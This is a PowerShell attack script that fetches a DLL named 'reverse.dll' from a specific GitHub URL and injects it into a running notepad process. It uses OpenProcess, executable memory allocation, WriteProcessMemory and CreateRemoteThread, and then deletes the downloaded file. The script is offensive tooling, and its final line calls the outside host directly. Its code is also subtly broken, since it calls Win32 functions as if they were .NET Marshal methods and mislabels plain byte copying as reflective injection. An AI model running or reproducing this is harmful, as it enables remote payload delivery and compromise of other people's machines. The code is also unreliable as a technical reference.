# Function to download the DLL from a given URL
function Download-DLL {
    param (
        [string]$Url,
        [string]$OutputPath
    )
    
    try {
        # Download the DLL from the URL
        Write-Host "[*] Downloading DLL from $Url"
        Invoke-WebRequest -Uri $Url -OutFile $OutputPath
        Write-Host "[+] DLL downloaded to $OutputPath"
        return $true
    } catch {
        Write-Host "[!] Failed to download DLL: $_"
        return $false
    }
}

# Invoke-ReflectivePEInjection (Modified) - Inject DLL into a process
function Invoke-ReflectivePEInjection {
    param (
        [string]$DllUrl,  # URL to download DLL
        [string]$ProcessName = "notepad"  # Default process name
    )
    
    # Temporary path for storing downloaded DLL
    $dllPath = "$env:temp\reverse.dll"
    
    # Step 1: Download the DLL from the web
    $downloadResult = Download-DLL -Url $DllUrl -OutputPath $dllPath
    
    if (-not $downloadResult) {
        Write-Host "[!] DLL download failed. Exiting."
        return
    }

    # Step 2: Read the DLL into memory as a byte array
    $PEBytes = [IO.File]::ReadAllBytes($dllPath)
    
    # Step 3: Find the process to inject into
    $process = Get-Process -Name $ProcessName -ErrorAction SilentlyContinue
    if ($null -eq $process) {
        Write-Host "[!] Could not find process: $ProcessName"
        return
    }
    $processId = $process.Id
    Write-Host "[*] Injecting DLL into process ID: $processId"

    # Step 4: Open the process and inject the DLL
    $handle = [System.Runtime.InteropServices.Marshal]::OpenProcess(0x001F0FFF, $false, $processId)
    
    if (-not $handle) {
        Write-Host "[!] Failed to open process."
        return
    }
    
    $addr = [System.Runtime.InteropServices.Marshal]::VirtualAllocEx($handle, [IntPtr]::Zero, $PEBytes.Length, 0x3000, 0x40)
    [System.Runtime.InteropServices.Marshal]::WriteProcessMemory($handle, $addr, $PEBytes, $PEBytes.Length, [ref]0)
    
    $thread = [System.Runtime.InteropServices.Marshal]::CreateRemoteThread($handle, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]0)
    
    if (-not $thread) {
        Write-Host "[!] Failed to create remote thread."
    } else {
        Write-Host "[+] Successfully injected DLL into $ProcessName (PID: $processId)"
    }

    # Step 5: Clean up
    [System.Runtime.InteropServices.Marshal]::CloseHandle($handle)
    Remove-Item $dllPath -Force
}

# Example usage: modify with your URL
# Provide the URL to the DLL and the process you want to inject into
Invoke-ReflectivePEInjection -DllUrl "https://github.com/AlexTriumf/pst/raw/refs/heads/main/reverse.dll" -ProcessName "notepad"
